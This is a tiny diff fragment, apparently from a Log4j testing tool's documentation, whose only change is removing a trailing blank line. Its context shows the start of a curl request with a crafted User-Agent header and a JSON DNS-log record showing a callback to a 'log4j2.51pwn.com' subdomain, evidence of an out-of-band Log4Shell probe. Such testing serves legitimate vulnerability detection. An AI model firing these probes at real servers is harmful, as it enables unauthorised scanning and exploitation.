@@ -96,4 +96,3 @@ curl -v -H 'user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Fir
 ```json
 {"ip":"172.70.209.200","domain":"xx22.log4j2.51pwn.com","type":"dnslog","date":"2022-01-23 05:19:53"}                                                                                             
 ```
-
